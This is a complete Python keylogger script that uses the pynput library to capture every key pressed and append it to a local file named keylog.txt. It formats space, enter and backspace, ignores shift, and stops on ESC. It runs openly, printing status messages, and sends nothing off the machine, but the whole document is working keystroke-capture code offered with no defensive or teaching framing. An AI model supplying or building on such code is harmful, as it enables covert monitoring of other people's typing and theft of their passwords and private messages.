from pynput import keyboard

log_file = "keylog.txt"

def write_to_file(key):
    try:
        with open(log_file, "a") as f:
            k = str(key).replace("'", "")
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
                pass
            else:
                f.write(k)
    except Exception as e:
        print(f"Error writing to log: {e}")

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Escape pressed — stopping keylogger.")
        return False 

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
